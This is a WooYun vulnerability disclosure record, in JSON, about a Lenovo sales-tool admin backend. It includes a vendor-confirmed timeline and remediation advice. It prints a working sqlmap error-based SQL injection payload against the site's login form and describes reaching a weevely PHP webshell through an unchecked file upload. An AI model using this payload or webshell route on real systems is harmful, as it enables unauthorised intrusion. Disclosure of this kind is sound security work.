{"id": 1283, "wybug_id": "wooyun-2014-071163", "wybug_title": "联想某助销工具后台注入&amp;get shell", "wybug_corp": "联想", "wybug_author": "修码的马修", "wybug_date": "2014-08-05 20:30", "wybug_open_date": "2014-09-19 20:32", "wybug_type": "成功的入侵事件", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["任意文件上传", "安全意识不足"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-08-05：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-08-08：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-08-18：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-08-28：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-09-07：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-09-19：\t细节向公众公开  简要描述： 联想产品多业务广，旗下有很多销售业务相关的管理后台，然而部分这类网站的安全状况堪忧。 详细说明：  网站：http://www.lenovostoreapp.com/后台登陆处存在post注入：http://www.lenovostoreapp.com/admin/index.php\n\n抓post包扔进sqlmap：\nsqlmap identified the following injection points with a total of 62 HTTP(s) requests:---Place: POSTParameter: user    Type: error-based    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause    Payload: user=A' AND (SELECT 1917 FROM(SELECT COUNT(*),CONCAT(0x3a68726e3a,(SELECT (CASE WHEN (1917=1917) THEN 1 ELSE 0 END)),0x3a7461763a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'bwuX'='bwuX&upass=A&button=++%E7%99%BB%E5%BD%95++---sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: POSTParameter: user    Type: error-based    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause    Payload: user=A' AND (SELECT 1917 FROM(SELECT COUNT(*),CONCAT(0x3a68726e3a,(SELECT (CASE WHEN (1917=1917) THEN 1 ELSE 0 END)),0x3a7461763a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'bwuX'='bwuX&upass=A&button=++%E7%99%BB%E5%BD%95++\n跑出一个叫lenovoStoreApp的数据库，里头有8个表，手到擒来地找到管理密码（出于对该网站的尊重和保护，详细步骤略去）反查到md5，密码弱到不堪入目，就是不用注入都能轻易跑出来的那种弱密码。登陆后台，点击添加编辑器界面有上传的地方，对文件类型毫无防御，轻易上shell\n\n   漏洞证明：  用的是weevely的php马\n\n查看服务器信息\n\n另外可以看到同服务器上的其他联想业务网站，数量还不少，搞搞旁注还是可以的。\n\n友情检测，不深入。如无意外，shell已删除。PS：出于对厂商的尊重，码打得有点多了，各位看官见谅。   修复方案：  1.post注入，就加上你们业务网站广泛使用的防注入程序就可以了。2.弱密码，网站的用户数又不多，这个好处理吧。3.上传文件处一定要检测文件类型还是那句话，联想业务广，但不能忽略这类后台网站。危害：1.该站就有提供产品展示APP的下载，只要把APP换掉，大量种马，后果不堪设想。2.shel都轻易拿到了，提权旁站一条龙还远吗？   版权声明：转载请注明来源 修码的马修@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2014-08-08 10:03 厂商回复： 感谢您对联想信息安全工作的支持,我们会尽快修复漏洞 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-09-20 00:39 |    \t\tlatershow \t\t\t( 路人 |\t\t\t        Rank:24 漏洞数:6        | andr0day)\t\t \n  蛮严重的洞。才给10    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}